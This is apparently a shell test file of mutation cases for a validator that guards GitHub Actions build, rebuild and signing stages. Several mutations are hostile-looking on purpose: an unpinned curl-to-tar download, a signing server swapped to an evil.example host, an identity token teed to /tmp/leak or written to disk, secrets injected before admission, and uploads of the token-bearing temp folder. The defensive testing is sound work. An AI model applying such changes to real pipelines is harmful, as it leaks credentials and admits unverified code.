st s_ar_if      "AC16 an if on the pull step (a skipped pull is a build with no archive)" "archive-pull.sh" 'name: pull the archive by its committed digest\n' 'name: pull the archive by its committed digest\n        if: always()\n'
st s_ar_cdest   "AC16 crane installed to another directory (archive-pull.sh names /usr/local/bin/crane)" "install-scanner.sh crane" 'install-scanner.sh crane' 'install-scanner.sh crane /tmp/bin'
st s_ar_bycrane "AC16 the archive fetched by a crane command in the stage instead of archive-pull.sh" "archive-pull.sh" "$PULLRUN" 'run: crane pull ghcr.io/fosterstack/archive:latest archive'
st s_go_other "AC4 the Go install line names another target" "install-scanner.sh go" 'install-scanner.sh go' 'install-scanner.sh go 1.20'
FXD_4='run: curl -sSL https://go.dev/dl/go1.27.2.linux-amd64.tar.gz | tar xz -C /usr/local'
st s_go_curl  "AC4 Go downloaded by hand instead of the pinned installer" "install-scanner.sh go" 'run: bash bin/install-scanner.sh go' "$FXD_4"
st s_go_act   "AC4 the setup-go action instead of the pinned installer (its bytes are not pinned by a repository checksum)" "setup-go" "$GOINST" '      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:\n          go-version-file: go.mod\n          cache: false\n'
st s_go_if    "AC4 the Go install carries an if" "install-scanner.sh go" 'name: install Go (pinned by checksum)\n' 'name: install Go (pinned by checksum)\n        if: always()\n'
# Codex A r4 #1 (advisor reading of rule 51, a reading and not a reworded rule): admission is the first TRUST decision of Build. Before the step that runs
# bin/witnessed-local.sh apk (admission is its first command) the apk job may hold ONLY the checkout, the mode guard (a non-secret input, refuses only) and the two
# checksum-verified install lines; nothing with a token, a secret, a build command, a download, an upload or the identity token may come before it.
st s_pre_env   "AC4 an env on an install step before admission (a token or secret could reach tagged code)" "before admission" 'name: install Go (pinned by checksum)\n' 'name: install Go (pinned by checksum)\n        env:\n          GH_TOKEN: ${{ github.token }}\n'
st s_pre_sec   "AC4 a secret on a step before admission" "before admission" 'name: install Witness (pinned by checksum)\n' 'name: install Witness (pinned by checksum)\n        env:\n          K: ${{ secrets.KEY }}\n'
st s_pre_build "AC4 a build command before admission" "before admission" "$GOINST" "$GOINST      - name: build early\n        run: bash bin/build-apk.sh --variant standard\n"
st s_pre_up    "AC4 an upload before admission" "before admission" "$GOINST" "$GOINST      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: early\n          path: out\n"
st s_pre_down  "AC4 a download before admission" "before admission" "$GOINST" "$GOINST      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65 # v5.0.0\n        with:\n          name: x\n          path: x\n"
st s_pre_tok   "AC4 a step that reads the identity token before admission" "before admission" "$GOINST" "$GOINST      - name: token\n        run: bash bin/x.sh \"\$ACTIONS_ID_TOKEN_REQUEST_TOKEN\"\n"
st s_pre_wit   "AC4 a Witness step before admission (the helper itself runs admission first, so it is the admission step, but a second early one is not)" "before admission" "$GOINST" "$GOINST      - name: early under Witness\n        run: bash bin/witnessed-local.sh apk bin/build-stage-apk.sh\n"
st s_pre_other "AC4 any other run step before admission" "before admission" "$GOINST" "$GOINST      - name: other\n        run: bash bin/chain-hostile-step.sh\n"
st s_shallow "AC2 a shallow checkout (build-admit needs the history and the tags)" "exactly" '          fetch-depth: 0\n' ''
FXD_5='run: curl -sSL https://example.com/witness | tar xz -C /usr/local/bin'
st s_install "AC2 Witness installed by an unpinned download" install 'run: bash bin/install-scanner.sh witness' \
       "$FXD_5"
st s_mid "AC2 a third-party action between the install and Witness (rule 68)" "step" '      - name: apk under Witness' \
       '      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n      - name: apk under Witness'
st s_ghenv  "AC2 another token than github.token on the Witness step" "GH_TOKEN" 'GH_TOKEN: ${{ github.token }}' 'GH_TOKEN: ${{ secrets.GH_PAT }}'
st s_nogh   "AC2 the admission job without GH_TOKEN (gh cannot read the checks)" "GH_TOKEN" '        env:\n          GH_TOKEN: ${{ github.token }}\n' ''
st s_if "AC2 an if: other than the mode on the Witness step" "release Witness step" \
    '      - name: apk under Witness\n        if: ${{ inputs.mode == '"'release'"' }}\n' \
       '      - name: apk under Witness\n        if: always()\n'
st s_shell "AC2 a shell: override on the Witness step" "Witness step may carry" '      - name: apk under Witness\n' \
       '      - name: apk under Witness\n        shell: bash -c "{0}"\n'
st s_two "AC2 a second command in the Witness step" "exactly the one line" 'run: bash bin/witnessed-local.sh apk bin/build-stage-apk.sh' 'run: |\n          bash bin/witnessed-local.sh apk bin/build-stage-apk.sh\n          echo second'
st s_direct "AC2 a direct witness run in a stage file (every stage goes through bin/witnessed-local.sh)" "witness run" \
       'run: bash bin/witnessed-local.sh apk bin/build-stage-apk.sh' 'run: witness run --step apk -- timeout 540 bash bin/build-stage-apk.sh'
st s_kind   "AC2 the apk job running the assemble script" "exactly the one line" 'bin/build-stage-apk.sh' 'bin/build-stage-assemble.sh'
st s_step "AC2 the Witness step named differently from its job (the step name selects the record path)" "exactly the one line" 'witnessed-local.sh apk bin' \
       'witnessed-local.sh build bin'
HOSTILE_STEP='      - name: hostile step (dry run only)\n        if: ${{ inputs.hostile }}\n        run: bash bin/chain-hostile-step.sh\n'
st s_hin_none "AC2 the hostile input is missing from the Build stage" "on: must be" \
              '      hostile:\n        description: dry run only\n        type: boolean\n        default: false\n' ''
st s_hin_str  "AC2 the hostile input is a string (a null caller input must not reach the live chain)" "on: must be" 'type: boolean' 'type: string'
st s_hin_req  "AC2 the hostile input is required" "on: must be" '        description: dry run only\n        type: boolean\n        default: false\n' \
              '        description: dry run only\n        type: boolean\n        default: false\n        required: true\n'
st s_hstep_none "AC2 the hostile step is missing (PR 1's contract: a step gated by inputs.hostile in the Build job)" "hostile" "$HOSTILE_STEP" ''
st s_hstep_noif "AC2 the hostile step has no if (it would run in every release)" "hostile" '        if: ${{ inputs.hostile }}\n        run: bash' \
    '        run: bash'
st s_hstep_alw  "AC2 the hostile step runs always()" "hostile" '        if: ${{ inputs.hostile }}\n        run: bash' '        if: always()\n        run: bash'
st s_hup_name   "AC2 the hostile attempts are uploaded under another name" "hostile" 'name: hostile-attempts' 'name: attempts'
st s_hup_noif   "AC2 the hostile upload has no if" "hostile" '        if: ${{ inputs.hostile }}\n        uses:' '        uses:'
# REQ-CHAIN-004-AC12: snapshot mode. One input, mode (string, default release); a guard step refuses any other value; two Witness steps, one per mode, with
# closed step names; no admission and no GH_TOKEN in the snapshot step.
GUARD_STEP='      - name: the mode is release or snapshot\n        env:\n          MODE: ${{ inputs.mode }}\n        run: bash bin/build-stage-refuse-mode.sh "$MODE"\n'
SNAP_IF="if: \${{ inputs.mode == 'snapshot' }}"
SNAP_STEP="      - name: snapshot-apk under Witness\n        $SNAP_IF\n        run: bash bin/witnessed-local.sh snapshot-apk bin/build-stage-snapshot-apk.sh\n"
RSNAP_STEP="      - name: snapshot-rapk under Witness\n        $SNAP_IF\n        run: bash bin/witnessed-local.sh snapshot-rapk bin/build-stage-rapk.sh\n"
RSNAP_STEP="$RSNAP_STEP      - name: rapk under Witness\n"
st s_mode_none "AC12 the mode input is missing from the Build stage" "on: must be" \
              '      mode:\n        description: release or snapshot\n        type: string\n        default: release\n' ''
st s_mode_snap "AC12 the mode defaults to snapshot (a caller that passes nothing would build a snapshot)" "on: must be" 'default: release' 'default: snapshot'
st s_mode_bool "AC12 the mode is a boolean" "on: must be" 'type: string' 'type: boolean'
st s_mode_req  "AC12 the mode is required" "on: must be" '        default: release\n' '        default: release\n        required: true\n'
st s_guard_none "AC12 the mode guard is missing (any other mode would skip both Witness steps and upload nothing, green)" "mode guard" \
              "$GUARD_STEP" ''
st s_guard_open "AC12 the mode guard judges a constant, not the input" "mode guard" 'refuse-mode.sh "$MODE"' 'refuse-mode.sh release'
st s_guard_env "AC12 the mode guard reads another value than the input" "mode guard" '          MODE: ${{ inputs.mode }}\n' '          MODE: release\n'
st s_guard_if "AC12 the mode guard carries an if (GitHub compares case-insensitively there, so it could be skipped for a mixed-case mode)" "mode guard" '          MODE: ${{ inputs.mode }}\n' \
              '          MODE: ${{ inputs.mode }}\n        if: ${{ inputs.mode != '"'release'"' }}\n'
st s_guard_coe "AC12 the mode guard is allowed to fail (continue-on-error)" "mode guard" '          MODE: ${{ inputs.mode }}\n' \
              '          MODE: ${{ inputs.mode }}\n        continue-on-error: true\n'
st s_rel_noif  "AC12 the release Witness step has no if (it would run in a snapshot, with admission)" "release Witness step" \
              '      - name: apk under Witness\n        if: ${{ inputs.mode == '"'release'"' }}\n' '      - name: apk under Witness\n'
st s_rel_snap  "AC12 the release Witness step runs in snapshot mode" "release Witness step" \
              'apk under Witness\n        if: ${{ inputs.mode == '"'release'"' }}' 'apk under Witness\n        if: ${{ inputs.mode == '"'snapshot'"' }}'
st s_snap_none "AC12 the snapshot Witness step is missing (a snapshot would build nothing, green)" "snapshot" \
              "$SNAP_STEP" ''
st s_snap_noif "AC12 the snapshot Witness step has no if (it would run in a release too)" "snapshot" \
              'snapshot-apk under Witness\n        if: ${{ inputs.mode == '"'snapshot'"' }}\n' 'snapshot-apk under Witness\n'
st s_snap_rel  "AC12 the snapshot Witness step runs the release script (admission and the tag)" "snapshot" \
              'snapshot-apk bin/build-stage-snapshot-apk.sh' 'snapshot-apk bin/build-stage-apk.sh'
st s_snap_name "AC12 the snapshot Witness step uses a step name outside the closed list" "snapshot" \
              'snapshot-apk bin/build-stage-snapshot-apk.sh' 'snapshot bin/build-stage-snapshot-apk.sh'
st s_snap_relname "AC12 the snapshot script runs under the release step name (its record would not carry the snapshot marker)" "snapshot" \
              'witnessed-local.sh snapshot-apk bin/build-stage-snapshot-apk.sh' 'witnessed-local.sh apk bin/build-stage-snapshot-apk.sh'
st s_snap_gh   "AC12 the snapshot Witness step holds GH_TOKEN" "snapshot" \
              'snapshot-apk under Witness\n        if: ${{ inputs.mode == '"'snapshot'"' }}\n' \
              'snapshot-apk under Witness\n        if: ${{ inputs.mode == '"'snapshot'"' }}\n        env:\n          GH_TOKEN: ${{ github.token }}\n'
st s_snap_asm  "AC12 the assemble job's snapshot step carries another job's snapshot step name" "snapshot" \
              'witnessed-local.sh snapshot-build bin/build-stage-snapshot-assemble.sh' 'witnessed-local.sh snapshot-rebuild bin/build-stage-snapshot-assemble.sh'
st s_outapk  "AC2 the stage output reads the apk job's output, not the assemble job's" "on: must be" 'value: ${{ jobs.assemble.outputs.digests }}' \
             'value: ${{ jobs.apk.outputs.digests }}'
st s_outnone "AC2 the stage has no digests output (Sign would get nothing)" "on: must be" \
             '    outputs:\n      digests:\n        description: the digests.json text, for Sign\n        value: ${{ jobs.assemble.outputs.digests }}\n' ''
st s_outextra "AC2 the stage exposes a second output" "on: must be" 'description: the digests.json text, for Sign' \
             'description: the digests.json text, for Sign\n      items:\n        value: ${{ jobs.assemble.outputs.digests }}'
st s_joboutstep "AC2 the assemble job's output reads a step of another job" "must expose exactly" \
             'digests: ${{ steps.digests.outputs.digests }}' 'digests: ${{ needs.apk.outputs.digests }}'
st s_joboutnone "AC2 the assemble job exposes no output" "must expose exactly" '    outputs:\n      digests: ${{ steps.digests.outputs.digests }}\n' ''
st s_exposeother "AC2 the expose step reads another file than digests.json" "id: digests" 'jq -c . digests.json' 'jq -c . items.json'
st s_exposecat  "AC2 the expose step is not the pinned form (cat of the file)" "id: digests" \
             'echo "digests=$(jq -c . digests.json)" >> "$GITHUB_OUTPUT"' 'cat digests.json >> "$GITHUB_OUTPUT"'
st s_exposeid   "AC2 the expose step has another id" "id: digests" '      - id: digests' '      - id: other'
st s_upname "AC2 an upload under another name" "upload-artifact" 'name: digests' 'name: registry-creds'
st s_uptemp "AC2 an upload of the runner temp folder (it holds the identity token)" "upload-artifact" 'path: digests.json' 'path: ${{ runner.temp }}'
st s_updot  "AC2 an upload of the whole workspace" "upload-artifact" 'path: digests.json' 'path: .'
st s_upmany "AC2 an upload of two paths (the artifact is rooted at their common ancestor, so every file name in it changes)" "ONE path" 'path: out\n' \
       'path: |\n            out\n            items-apk.json\n'
st s_upkey "AC2 an upload with an extra with: key" "upload-artifact" 'name: items\n          path: items.json' \
       'name: items\n          retention-days: 90\n          path: items.json'
st s_upmiss "AC2 a required upload missing (dist)" "steps" \
       '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: dist\n          path: dist\n' \
       ''
st s_upextra "AC2 an extra upload after the allowed ones" "no extra step" 'name: images\n          path: out\n' \
       "name: images\n          path: out\n${UPLOAD}          name: extra\n          path: out\n"
st s_dlname "AC2 a download of a name outside the table" "download-artifact" 'name: apk-ubuntu-24.04\n          path: apk/ubuntu-24.04' \
       'name: dist\n          path: apk/ubuntu-24.04'
st s_dlpin "AC2 a download not pinned by digest" "download-artifact" 'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e65' \
       'actions/download-artifact@v5'
st s_dldot  "AC2 a download into . (a tampered artifact could overwrite committed scripts)" "download-artifact" 'path: apk/ubuntu-24.04\n' 'path: .\n'
st s_dlbin  "AC2 a download into bin/" "download-artifact" 'path: apk/ubuntu-24.04\n' 'path: bin\n'
st s_dlsame "AC2 both architectures downloaded into the SAME directory (the amd64 apk could feed arm64)" "download-artifact" \
       'path: apk/ubuntu-24.04-arm\n' 'path: apk/ubuntu-24.04\n'
st s_dlmiss "AC2 the arm apk download missing" "steps" \
       "${DOWNLOAD}          name: apk-ubuntu-24.04-arm\n          path: apk/ubuntu-24.04-arm\n" \
       ''
st s_dlrun "AC2 a download with a run-id (it would pull another run's artifact)" "download-artifact" \
       'name: apk-ubuntu-24.04\n          path: apk/ubuntu-24.04' 'name: apk-ubuntu-24.04\n          run-id: 1\n          path: apk/ubuntu-24.04'
st s_dlapk "AC2 the Build apk job downloads something (it takes nothing from outside)" "steps" '      - name: apk under Witness' \
       "${DOWNLOAD}          name: witness-build\n          path: x\n      - name: apk under Witness"
st s_after "AC2 a third-party action after Witness" "step" \
       '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: digests' \
       '      - uses: actions/cache@0000000000000000000000000000000000000000 # v4\n        with:\n          name: digests'
st s_comp   "AC2 a local composite action step" "step" '      - name: apk under Witness' '      - uses: ./.github/actions/x\n      - name: apk under Witness'
st s_docker "AC2 a docker:// step" "step" '      - name: apk under Witness' '      - uses: docker://alpine:3\n      - name: apk under Witness'
rb() { replace "$work/rebuild.yml" "$work/$1.yml" "$4" "$5" && expect caught "$2" "$3" stage "$work/$1.yml" rebuild "$AL"; return 0; }
rb r_step "005-AC1 Rebuild's assemble Witness step is named build (Build's record path)" "exactly the one line" 'witnessed-local.sh rebuild bin' \
       'witnessed-local.sh build bin'
rb r_up   "005-AC4 Rebuild uploads anything but its verdict directory" "upload-artifact" 'name: witness-rebuild' 'name: dist'
rb r_dl "005-AC4 Rebuild downloads Build's dist (it takes only the record and the lists)" "download-artifact" \
       "name: \${{ inputs.mode == 'release' && 'signed-witness-build' || 'witness-build' }}\n          path: witness-build" 'name: dist\n          path: witness-build'
rb r_gh "005-AC1 a GH_TOKEN on Rebuild (only the admission job holds it)" "env" '      - name: rapk under Witness' \
       '      - name: rapk under Witness\n        env:\n          GH_TOKEN: ${{ github.token }}'
rb r_out "005-AC1 Rebuild exposes a second stage output (its only output is the record digests)" "on: must be" '    outputs:\n      records:' \
             '    outputs:\n      digests:\n        value: ${{ jobs.assemble.outputs.digests }}\n      records:'
rb r_recgone "R2 the record-digest step is gone from Rebuild's assemble job" "must be exactly id: records" '      - id: records\n        name: expose the record digests as the stage output\n        if: ${{ inputs.mode == '"'"'release'"'"' }}\n        run: r=$(bash bin/rebuild-records-digests.sh witness-rebuild rec-rapk/ubuntu-24.04 rec-rapk/ubuntu-24.04-arm) && echo "records=$r" >> "$GITHUB_OUTPUT"\n' ''
rb r_recid "R2 the record-digest step has another id" "must be exactly id: records" '      - id: records' '      - id: other'
rb r_recmask "R2 (round 6) the records step masks a failing helper (an echo of the substitution loses its exit status)" "must be exactly id: records" 'r=$(bash bin/rebuild-records-digests.sh witness-rebuild rec-rapk/ubuntu-24.04 rec-rapk/ubuntu-24.04-arm) && echo "records=$r"' 'echo "records=$(bash bin/rebuild-records-digests.sh witness-rebuild rec-rapk/ubuntu-24.04 rec-rapk/ubuntu-24.04-arm)"'
rb r_recdir "R2 the record-digest step reads another rapk directory" "must be exactly id: records" 'rec-rapk/ubuntu-24.04-arm)' 'rec-rapk/ubuntu-24.04)'
rb r_recif "R2 the record-digest step runs in snapshot mode too" "must be exactly id: records" "        if: \${{ inputs.mode == 'release' }}\n        run: r=" '        run: r='
rb r_recjob "R2 the assemble job exposes the records of another step" "must expose exactly" 'steps.records.outputs.records }}\n    steps' 'steps.other.outputs.records }}\n    steps'
rb r_ht_gone "005-AC17 the host-tools step is missing from Rebuild's apk job" "install-host-bwrap" "$HTSTEP" ''
rb r_ht_asm  "005-AC17 Rebuild's assemble job unpacks the host tools too (it runs apko only)" "crane" "$APKINST" "$APKINST$HTSTEP"
rb r_hin "005-AC1 Rebuild takes the hostile input (only Build has a hostile step)" "on: must be" '    inputs:\n      mode:' \
             '    inputs:\n      hostile:\n        type: boolean\n        default: false\n      mode:'
# Release review R1 (Oct 21), REQ-CHAIN-005-AC2/AC6: Rebuild's apk job installs the same checksum-pinned Go toolchain as Build's (build-apk.sh refuses to run in CI without it), right after Witness
rb r_go_gone  "005-AC2 the Go toolchain install is missing from Rebuild's apk job (build-apk.sh would die in CI)" "install-scanner.sh go" "$GOINST" ''
rb r_go_twice "005-AC2 Rebuild's apk job installs Go twice" "step" "$GOINST" "$GOINST$GOINST"
rb r_go_first "005-AC2 Go installed BEFORE Witness in Rebuild (rule 68: Witness first)" "install-scanner.sh" "$WINST$GOINST" "$GOINST$WINST"
rb r_go_asm   "005-AC2 Rebuild's assemble job installs Go too (an assemble job installs apko only)" "install-" "$APKINST" "$GOINST$APKINST"
rb r_go_other "005-AC2 Rebuild's Go install is another command (not the pinned installer)" "install-scanner.sh go" 'run: bash bin/install-scanner.sh go' 'run: bash bin/install-scanner.sh go /tmp/go'
# REQ-CHAIN-005-AC7: Rebuild takes the same mode input and has its own snapshot Witness steps, snapshot-rapk and snapshot-rebuild
RSNAP_IF="if: \${{ inputs.mode == 'snapshot' }}"
RSNAP_OWN="      - name: snapshot-rapk under Witness\n        $RSNAP_IF\n"
RSNAP_OWN="${RSNAP_OWN}        run: bash bin/witnessed-local.sh snapshot-rapk bin/build-stage-snapshot-rebuild-apk.sh\n"
rb r_mode_none "005-AC7 the mode input is missing from the Rebuild stage" "on: must be" \
       '    inputs:\n      mode:\n        description: release or snapshot\n        type: string\n        default: release\n' ''
rb r_mode_snap "005-AC7 the Rebuild mode defaults to snapshot" "on: must be" 'default: release' 'default: snapshot'
rb r_guard_none "005-AC7 the Rebuild mode guard is missing" "mode guard" "$GUARD_STEP" ''
rb r_rel_noif "005-AC7 the release Witness step of Rebuild has no if (it would run in a snapshot too)" "release Witness step" \
       "      - name: rapk under Witness\n        if: \${{ inputs.mode == 'release' }}\n" "      - name: rapk under Witness\n"
rb r_snap_none "005-AC7 the snapshot-rapk Witness step is missing" "Witness step" \
       "$RSNAP_OWN" \
           ''
rb r_snap_rel "005-AC7 the snapshot-rapk step runs the release script (policy and stage-start of a release)" "Witness step" \
       'snapshot-rapk bin/build-stage-snapshot-rebuild-apk.sh' 'snapshot-rapk bin/build-stage-rebuild-apk.sh'
rb r_snap_name "005-AC7 the snapshot-rebuild step uses a name outside the closed list" "Witness step" \
       'witnessed-local.sh snapshot-rebuild bin/build-stage-snapshot-rebuild-assemble.sh' 'witnessed-local.sh snapshot-evil bin/build-stage-snapshot-rebuild-assemble.sh'
rb r_snap_asmname "005-AC7 the snapshot-rapk step runs under the release step name" "Witness step" \
       'witnessed-local.sh snapshot-rapk bin/build-stage-snapshot-rebuild-apk.sh' 'witnessed-local.sh rapk bin/build-stage-snapshot-rebuild-apk.sh'
# I5 (step-8, Opus): the Rebuild verdict artifact is uploaded under if: always(), so snapshot-verdict.json is readable even when rebuild-compare failed; no other upload is
VUP="        if: always()\n        with:\n          name: witness-rebuild"
rb r_verdict_noif "005-AC7 the verdict upload has no if (a failed comparison would leave no artifact for the differences)" "if: always()" "$VUP" \
       "        with:\n          name: witness-rebuild"
rb r_verdict_success "005-AC7 the verdict upload runs only on success" "if: always()" "        if: always()\n        with:\n          name: witness-rebuild" \
       "        if: success()\n        with:\n          name: witness-rebuild"
rb r_other_always "005-AC7 another Rebuild upload under always()" "no if" "        with:\n          name: witness-rapk-ubuntu-24.04\n          path: witness-rapk" \
       "        if: always()\n        with:\n          name: witness-rapk-ubuntu-24.04\n          path: witness-rapk"
CHK="      - name: check the rapk records against their jobs' outputs\n        if: \${{ inputs.mode == 'release' }}\n        env:\n          RAPK_RECORDS: \${{ needs.rapk.outputs.records }}\n          RAPK_ARM_RECORDS: \${{ needs.rapk-arm.outputs.records }}\n        run: bash bin/rebuild-records-digests.sh --check \"\$RAPK_RECORDS\" \"\$RAPK_ARM_RECORDS\"\n"
rb r_chk_gone "A1 assemble does not check the rapk records against their jobs' outputs" "rapk records are checked" "$CHK" ''
rb r_chk_noif "A1 the rapk check runs in snapshot mode too" "rapk records are checked" "      - name: check the rapk records against their jobs' outputs\n        if: \${{ inputs.mode == 'release' }}\n" "      - name: check the rapk records against their jobs' outputs\n"
rb r_chk_swap "A1 the check hands the arm leg's output to the x86 leg" "rapk records are checked" 'RAPK_RECORDS: ${{ needs.rapk.outputs.records }}' 'RAPK_RECORDS: ${{ needs.rapk-arm.outputs.records }}'
rb r_chk_late "A1 the rapk check runs after the rebuild Witness step (too late)" "rapk records are checked" "$CHK      - name: rebuild under Witness\n" "      - name: rebuild under Witness\n"
rb r_needs_one "A1 assemble needs only one apk job" "must need exactly rapk and rapk-arm" 'needs: [rapk, rapk-arm]' 'needs: rapk'
rb r_rapkrec_gone "A1 the x86 apk job exposes no record digests" "must be exactly id: records" "      - id: records\n        name: expose the record digests of this apk job as its output\n        if: \${{ inputs.mode == 'release' }}\n        run: r=\$(bash bin/rebuild-records-digests.sh --rapk ubuntu-24.04 witness-rapk) && echo \"records=\$r\" >> \"\$GITHUB_OUTPUT\"\n" ''
rb r_rapkrec_leg "A1 the x86 apk job exposes the arm leg's name" "must be exactly id: records" '--rapk ubuntu-24.04 witness-rapk' '--rapk ubuntu-24.04-arm witness-rapk'
rb r_rapkrec_dir "A1 the x86 apk job lists another folder than the record it uploads" "must be exactly id: records" '--rapk ubuntu-24.04 witness-rapk)' '--rapk ubuntu-24.04 out)'
rb r_rapkrec_out "A1 the x86 apk job exposes its records through another output" "must expose exactly outputs: records" 'steps.records.outputs.records }}\n    steps' 'steps.other.outputs.records }}\n    steps'
rb r_rapk_matrix "A1 the apk jobs are a matrix again (a shared output name, the last leg wins)" "must run directly on ubuntu-24.04" '  rapk:\n    runs-on: ubuntu-24.04\n' '  rapk:\n    runs-on: ${{ matrix.runner }}\n'
rb r_rapkarm_gone "A1 the arm apk job exposes no record digests" "must be exactly id: records" "      - id: records\n        name: expose the record digests of this apk job as its output\n        if: \${{ inputs.mode == 'release' }}\n        run: r=\$(bash bin/rebuild-records-digests.sh --rapk ubuntu-24.04-arm witness-rapk) && echo \"records=\$r\" >> \"\$GITHUB_OUTPUT\"\n" ''
rb r_rapkarm_leg "A1 the arm apk job exposes the x86 leg's name" "must be exactly id: records" '--rapk ubuntu-24.04-arm witness-rapk' '--rapk ubuntu-24.04 witness-rapk'
rb r_chk_armswap "A1 the check hands the x86 leg's output to the arm leg" "rapk records are checked" 'RAPK_ARM_RECORDS: ${{ needs.rapk-arm.outputs.records }}' 'RAPK_ARM_RECORDS: ${{ needs.rapk.outputs.records }}'
rb r_chk_argswap "A1 the check's arguments are swapped" "rapk records are checked" '--check "$RAPK_RECORDS" "$RAPK_ARM_RECORDS"' '--check "$RAPK_ARM_RECORDS" "$RAPK_RECORDS"'
rb r_perm "005-AC1 Rebuild with the admission permissions" permissions '      contents: read\n' '      contents: read\n      checks: read\n'
replace "$work/build.yml" "$work/r_kind.yml" 'build-stage-apk.sh' 'build-stage-rebuild-apk.sh' && expect caught \
       "005-AC1 Build running the rebuild script" "exactly the one line" stage "$work/r_kind.yml" build "$AL"
expect caught "AC1 an unreadable allowed-actions list fails closed" "unreadable" stage "$work/build.yml" build "$work/does-not-exist.json"
# no workflow file is added (REQ-CHAIN-004-AC1): the v0.2.2 set, plus stage-sign.yml, minus the two files PR 2 removes
mkdir -p "$work/wf-ok" "$work/wf-new" "$work/wf-old"
for f in ci.yml release.yml scan.yml stage-build.yml stage-reproducibility.yml stage-verify.yml stage-promote.yml stage-sign.yml; do : > "$work/wf-ok/$f"; done
cp "$work/wf-ok"/* "$work/wf-new/"; : > "$work/wf-new/stage-extra.yml"
cp "$work/wf-ok"/* "$work/wf-old/"; : > "$work/wf-old/stage-admission.yml"
expect ok     "AC1 fixture: a workflow directory with stage-sign.yml and without stage-image.yml / stage-admission.yml passes" "" workflows "$work/wf-ok"
expect caught "AC1 a second new workflow file" "was added" workflows "$work/wf-new"
expect caught "AC1 stage-admission.yml still present" "still exists" workflows "$work/wf-old"
# ---- the Witness seam: bin/witnessed.sh is the only place the Witness flags and `timeout 540` live (REQ-CHAIN-004-AC2; rule 68 as amended) ------------
expect ok "AC2 fixture: the known-good bin/witnessed.sh is exactly the canonical helper" "" helper "$work/witnessed.sh"
expect ok "AC2 fixture: no stage file and no stage script names witness run" "" directwitness "$work/build.yml" "$work/rebuild.yml" "$work"/s-*.sh
hm() { replace "$work/witnessed.sh" "$work/h_$1.sh" "$3" "$4" && expect caught "$2" "helper command" helper "$work/h_$1.sh"; return 0; }
hm tnone   "AC2 no timeout (a build could outlive Fulcio's 10-minute certificate)" '-- timeout -k 20 540 bash "$@"' '-- bash "$@"'
hm t600    "AC2 timeout 600 (past the certificate's life)" '-- timeout -k 20 540' '-- timeout -k 20 600'
hm t0      "AC2 timeout 0 (no limit)" '-- timeout -k 20 540' '-- timeout -k 20 0'
hm tvar    "AC2 the limit from a variable" '-- timeout -k 20 540' '-- timeout -k 20 "$T"'
hm tnok    "AC2 round 1: no kill-after (a command that ignores TERM would hold the job)" '-- timeout -k 20 540' '-- timeout 540'
hm tk30    "AC2 round 1: another kill-after" '-- timeout -k 20 540' '-- timeout -k 30 540'
hm tbefore "AC2 the timeout around Witness instead of the command (the certificate is requested before it starts)" 'exec witness run' \
       'exec timeout 540 witness run'
hm furl    "AC2 another Fulcio address" 'https://fulcio.sigstore.dev' 'http://fulcio.evil.example'
hm ftsa    "AC2 another timestamp authority" 'https://timestamp.sigstore.dev/api/v1/timestamp' 'https://tsa.example/ts'
hm fdir    "AC2 witness -d (the command must run from the repo root)" '-o "witness-${step#snapshot-}' '-d out -o "witness-${step#snapshot-}'
hm fextra  "AC2 an extra Witness flag" '--env-filter-sensitive-vars' '--enable-archivista --env-filter-sensitive-vars'
hm fnoflt  "AC8 no environment filter flag (tokens would be recorded)" '--env-filter-sensitive-vars' ''
hm fnokey  "AC8 no token-variable key pattern" "--env-add-sensitive-key 'ACTIONS_ID_TOKEN_REQUEST*'" ''
hm fnogh   "AC8 GH_TOKEN not on the sensitive-key list" '--env-add-sensitive-key GH_TOKEN' ''
hm fslsa   "AC2 the slsa attestor (provenance is Sign's alone)" 'environment,git,material,product' 'environment,git,material,slsa'
hm fgha    "AC8 the github attestor (it embeds the raw OIDC token)" 'environment,git,material,product' 'environment,git,github,material,product'
hm fstep   "AC2 a fixed --step instead of the closed-list argument" '--step "$step"' '--step build'
hm fout    "AC2 the record written to another path" '"witness-${step#snapshot-}/$step-collection.json"' 'out/x.json'
hm fopen   "AC2 the step list is open" 'release-verify' '*'
hm fexec   "AC2 witness not exec'd (its exit status could be lost)" 'exec witness run' 'witness run'
hm ftee "AC2 the token written elsewhere" '| jq -r .value' '| jq -r .value | tee /tmp/leak'
hm ffile "AC2 the token in a file again (the older form): a file under the runner temp folder while the command runs" \
       '<(printf %s "$tok")' '"$RUNNER_TEMP/tok"'
hm ffileb "AC2 the token written to a file before the exec" 'echo "::add-mask::$tok"' 'echo "::add-mask::$tok"\nprintf %s "$tok" > "$RUNNER_TEMP/tok"'
hm fexport "AC2 the token exported into the wrapped command's environment" 'echo "::add-mask::$tok"' 'export tok\necho "::add-mask::$tok"'
hm fnomask "AC2 the token is not masked in the log" 'echo "::add-mask::$tok"' ''
hm fcat    "AC2 the token read through a second process substitution" '<(printf %s "$tok")' '<(cat <(printf %s "$tok"))'
hm fignore "AC2 a failure of the witnessed command is ignored" '-- timeout -k 20 540 bash "$@"' '-- timeout -k 20 540 bash "$@" || true'
hm fnounset "AC2 the identity-token variables are not unset before the wrapped command runs" \
   'unset ACTIONS_ID_TOKEN_REQUEST_TOKEN ACTIONS_ID_TOKEN_REQUEST_URL' ''
hm sigall "AC15 a helper that gives the sigstore token to every step but one (not to release-sign alone) is refused" 'if [ "$step" = release-sign ]; then' 'if [ "$step" != apk ]; then'
hm signomask "AC15 a helper that exports the sigstore token without masking it is refused" $'  echo "::add-mask::$sig"\n  export' '  export'
hm signofail "AC15 a helper that does not stop on an empty sigstore token is refused" $'  [ -n "$sig" ] && [ "$sig" != null ] || { echo "witnessed: no identity token for release-sign" >&2; exit 1; }\n' ''
hm fnounsetrt "AC2 the runtime-token variables are not unset before the wrapped command runs" 'unset ACTIONS_RUNTIME_TOKEN ACTIONS_RUNTIME_URL\n' ''
hm fsnapdir "AC12 a snapshot record would go to its own directory (the uploads would miss it)" 'mkdir -p "witness-${step#snapshot-}"' 'mkdir -p "witness-$step"'
